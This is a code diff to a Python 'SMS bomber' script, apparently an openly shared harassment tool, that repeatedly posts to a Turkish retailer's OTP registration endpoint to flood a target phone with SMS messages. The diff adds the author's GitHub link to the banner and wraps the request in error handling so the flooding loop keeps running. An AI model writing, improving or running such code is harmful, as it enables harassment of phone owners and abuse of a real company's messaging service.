@@ -14,12 +14,12 @@ colorama.init(autoreset=True)
 banner = Fore.MAGENTA+"""
  $$$$$$\  $$\      $$\  $$$$$$\        $$$$$$$\   $$$$$$\  $$\      $$\ $$$$$$$\  $$$$$$$$\ $$$$$$$\  
 $$  __$$\ $$$\    $$$ |$$  __$$\       $$  __$$\ $$  __$$\ $$$\    $$$ |$$  __$$\ $$  _____|$$  __$$\ 
-$$ /  \__|$$$$\  $$$$ |$$ /  \__|      $$ |  $$ |$$ /  $$ |$$$$\  $$$$ |$$ |  $$ |$$ |      $$ |  $$ |
+$$ /  \__|$$$$\  $$$$ |$$ /  \__|      $$ |  $$ |$$ /  $$ |d$$$$\  $$$$ |$$ |  $$ |$$ |      $$ |  $$ |
 \$$$$$$\  $$\$$\$$ $$ |\$$$$$$\        $$$$$$$\ |$$ |  $$ |$$\$$\$$ $$ |$$$$$$$\ |$$$$$\    $$$$$$$  |
  \____$$\ $$ \$$$  $$ | \____$$\       $$  __$$\ $$ |  $$ |$$ \$$$  $$ |$$  __$$\ $$  __|   $$  __$$< 
 $$\   $$ |$$ |\$  /$$ |$$\   $$ |      $$ |  $$ |$$ |  $$ |$$ |\$  /$$ |$$ |  $$ |$$ |      $$ |  $$ |
 \$$$$$$  |$$ | \_/ $$ |\$$$$$$  |      $$$$$$$  | $$$$$$  |$$ | \_/ $$ |$$$$$$$  |$$$$$$$$\ $$ |  $$ |
- \______/ \__|     \__| \______/       \_______/  \______/ \__|     \__|\_______/ \________|\__|  \__| """+Fore.RED+'- By ITXCHIAKAR'
+ \______/ \__|     \__| \______/       \_______/  \______/ \__|     \__|\_______/ \________|\__|  \__| """+Fore.RED+'- By ITXCHIAKAR'+f'\n\n          {Fore.LIGHTBLUE_EX}github.com/Itxchi808'
 
 
 print(banner)
@@ -46,10 +46,15 @@ def sikis():
         header = {
             'User-agent': ua
         }
-        res = req.post('https://www.migros.com.tr/rest/users/v2/register/otp',json=data,headers=header)
-        if res.json()['successful'] == True:
-            count = count+1
-            print(f'{Fore.GREEN} {count} {Fore.RESET} Adet SMS gönderildi.')
+        try:
+            res = req.post('https://www.migros.com.tr/rest/users/v2/register/otp',json=data,headers=header)
+            if res.json()['successful'] == True:
+                count = count+1
+                print(f'{Fore.GREEN} {count} {Fore.RESET} Adet SMS gönderildi.')
+            else:
+                pass
+        except:
+            pass
     for i in range(15):
         s = req.session() 
         headers3 = {
